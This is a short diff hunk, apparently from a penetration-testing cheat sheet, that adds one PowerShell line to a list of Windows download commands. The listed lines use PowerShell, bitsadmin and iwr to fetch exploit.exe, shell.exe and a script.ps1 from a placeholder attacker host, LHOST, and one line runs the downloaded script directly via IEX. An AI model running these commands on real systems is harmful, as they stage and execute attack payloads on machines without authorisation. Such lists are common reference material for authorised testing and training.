@@ -1654,6 +1654,7 @@ powershell -c "(New-Object Net.WebClient).DownloadFile('http://&lt;LHOST&gt;/fil
 powershell -c "Invoke-WebRequest -Uri http://&lt;LHOST&gt;/file.exe -OutFile file.exe"
 IEX(New-Object Net.WebClient).DownloadString('http://&lt;LHOST&gt;/script.ps1')
 (New-Object Net.WebClient).DownloadFile("http://&lt;LHOST&gt;/exploit.exe","exploit.exe")
+powershell -c "(New-Object Net.WebClient).DownloadFile('http://&lt;LHOST&gt;/exploit.exe','exploit.exe')"
 bitsadmin /transfer job /download /priority normal http://&lt;LHOST&gt;/file.exe C:\Temp\file.exe
 iwr -uri http://&lt;LHOST&gt;/shell.exe -outfile shell.exe
 
